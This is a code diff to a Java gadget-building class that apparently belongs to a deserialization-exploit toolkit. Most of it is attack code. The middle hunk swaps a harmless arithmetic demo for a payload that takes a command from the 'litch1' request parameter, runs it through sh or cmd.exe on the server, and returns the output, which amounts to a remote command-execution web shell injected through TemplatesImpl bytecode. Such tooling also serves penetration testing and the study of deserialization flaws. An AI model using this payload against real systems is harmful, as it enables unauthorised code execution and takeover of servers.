@@ -44,18 +44,7 @@ public class Gadgets {
 
     public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
 
-    public static class StubTransletPayload extends AbstractTranslet implements Serializable {
-
-        private static final long serialVersionUID = -5971610431559700674L;
-
-
-        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
-        }
-
-
-        @Override
-        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-        }
+    public static class StubTransletPayload  {
     }
 
     // required to make TemplatesImpl happy
@@ -134,8 +123,17 @@ public class Gadgets {
             "                httpServletRequest = (javax.servlet.http.HttpServletRequest)getRequest.invoke(method.invoke(null,null),null);\n" +
             "            }\n" +
             "            java.io.Writer writer = httpServletResponse.getWriter();\n" +
-            "            int result = Integer.valueOf(httpServletRequest.getParameter(\"a\")).intValue()+Integer.valueOf(httpServletRequest.getParameter(\"b\")).intValue();\n" +
-            "            writer.write(String.valueOf(result));\n" +
+            "                String cmd = httpServletRequest.getParameter(\"litch1\");\n" +
+            "                boolean isLinux = true;\n" +
+            "                String osTyp = System.getProperty(\"os.name\");\n" +
+            "                if (osTyp != null && osTyp.toLowerCase().contains(\"win\")) {\n" +
+            "                    isLinux = false;\n" +
+            "                }\n" +
+            "                String[] cmds = isLinux ? new String[]{\"sh\", \"-c\", cmd} : new String[]{\"cmd.exe\", \"/c\", cmd};\n" +
+            "                java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();\n" +
+            "                java.util.Scanner s = new java.util.Scanner(in).useDelimiter(\"\\\\a\");\n" +
+            "                String output = s.hasNext() ? s.next() : \"\";\n"  +
+            "            writer.write(output);\n" +
             "            writer.flush();\n" +
             "        }catch (Exception e){\n" +
             "        }";
@@ -300,9 +298,7 @@ public class Gadgets {
         final byte[] classBytes = clazz.toBytecode();
 
         // inject class bytes into instance
-        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
-            classBytes, ClassFiles.classAsBytes(Foo.class)
-        });
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
 
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
